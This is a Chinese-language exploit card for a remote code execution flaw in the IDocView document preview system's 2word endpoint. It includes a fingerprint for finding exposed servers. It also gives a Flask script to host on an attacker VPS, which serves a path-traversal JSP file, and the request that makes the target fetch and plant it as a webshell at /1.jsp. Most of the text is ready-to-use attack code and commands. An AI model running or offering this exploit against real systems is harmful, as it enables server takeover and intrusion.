# IDocView在线文档预览系统2word存在远程代码执行漏洞

- **系统**：IDocView　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name="I Doc View"`

**请求体 / payload**
```
1. 将下列脚本放到vps服务器上安装`flsk`
\[main.py]\(公众号：渗透安全HackTwo>
from flask import Flask
app = Flask(__name__)
@app.route('/index.html')
def step1():
return '''<link href="/..\\..\\..\\docview\\1.jsp">'''
@app.route('/..\\..\\..\\docview\\1.jsp')
def step2():
return '''<%
out.print("123");
%>'''
if __name__ == '__main__':
app.run(host="0.0.0.0", port=8088)
pip3 install flask
2. 运行该脚本，将在`8088`端口上启用一个web服务器
python3 main.py
3. 通过poc远程下载`webshell`,`url`为上一步地址
/html/2word?url=http://xx.xx.xx.xx/index.html
4. 下载文件地址
/1.jsp
```

**其他**
- I Doc View在线文档预览系统2word存在远程代码执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * I Doc View